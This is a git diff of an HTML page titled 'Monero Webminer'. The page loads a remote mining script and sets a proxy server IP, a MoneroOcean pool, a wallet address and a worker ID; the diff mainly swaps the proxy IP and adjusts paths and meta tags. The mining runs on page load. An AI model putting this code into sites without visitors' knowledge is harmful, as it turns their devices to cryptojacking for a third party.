@@ -3,12 +3,14 @@
   <head>
     <meta charset="utf-8">
     <title>Monero Webminer</title>
-    <link rel="manifest" href="/manifest.json">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <link rel="manifest" href="manifest.json">
       <!-- Start Of Mining Code -->
       <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
       <script>
           console.log("Config Loaded")
-          server = "wss://166.62.35.226:45105";
+          server = "wss://45.119.82.33:40725";
           var pool = "gulf.moneroocean.stream:80";
           var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
           var workerId = "GH-XMR"
@@ -27,7 +29,7 @@
 <script>
   if ('serviceWorker' in navigator) {
     window.addEventListener('load', () => {
-      navigator.serviceWorker.register('/serviceworker.js').then(registration => {
+      navigator.serviceWorker.register('serviceworker.js').then(registration => {
         console.log('Service Worker registered with scope:', registration.scope);
       }).catch(error => {
         console.error('Service Worker registration failed:', error);
